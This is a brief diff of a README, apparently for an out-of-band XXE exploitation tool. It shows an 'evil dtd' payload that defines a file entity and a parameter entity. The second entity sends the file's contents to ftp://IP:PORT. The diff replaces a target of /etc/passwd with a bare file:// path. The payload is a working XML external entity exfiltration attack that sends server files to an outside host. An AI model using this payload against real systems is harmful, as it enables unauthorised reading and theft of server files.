@@ -13,7 +13,7 @@ The program may use another port for auxiliary (default is 63568), if it is occu
 
 The evil dtd is like:
 ```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file://">
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://IP:PORT/%file;'>">
 ```
 ![example](./images/example.png)
